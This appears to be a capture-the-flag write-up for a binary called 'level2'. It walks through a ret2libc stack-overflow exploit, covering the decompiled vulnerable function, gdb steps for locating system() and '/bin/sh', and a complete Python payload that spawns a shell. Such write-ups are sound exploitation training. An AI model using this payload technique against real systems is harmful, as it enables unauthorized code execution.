Here is the decompiled binary :

```c
void p(void)

{
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

void main(void)

{
  p();
  return;
}
```

We can perform a kind of ret2libc attack on this code (https://shellblade.net/files/docs/ret2libc.pdf)

Since there is a if checking that the return address is not coming from 0xb... memory, we bypass this protection by overflowing to a ret instruction (either main func or p func) and since a ret instruction pops the next address and jumps there, we follow it by system address with the correct parameter.

Our payload should be like this : 

```
[ padding ] + [ addr of a ret ] + [ addr of system() ] + [ 4 bytes padding ] + [ addr of "/bin/sh" ]
```

To find those address we can do in gdb :

`gdb ./level2` then `b main` then run the program, and then `p system/exit`
for ret address of p() : disas p and look at the address of the instruction ret.
for the string "/bin/sh", we can find it inside libc :

`info proc mappings` then find the start address and the end address of libc and then this command will find the string if it is inside the binary :

`find start_addr, end_addr, "/bin/sh"`

So we have all the elements for the payload :

offset : 80
ret address : 0x0804853e <+106>: ret
system() address : $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
exit() address : $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
`"/bin/sh"` : (gdb) 0xb7f8cc58

Our payload will look like this :
`(python -c 'print("\x90"* 80  + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x90\x90\x90\x90" + "\x58\xcc\xf8\xb7")'; cat)`
And we have a shell.
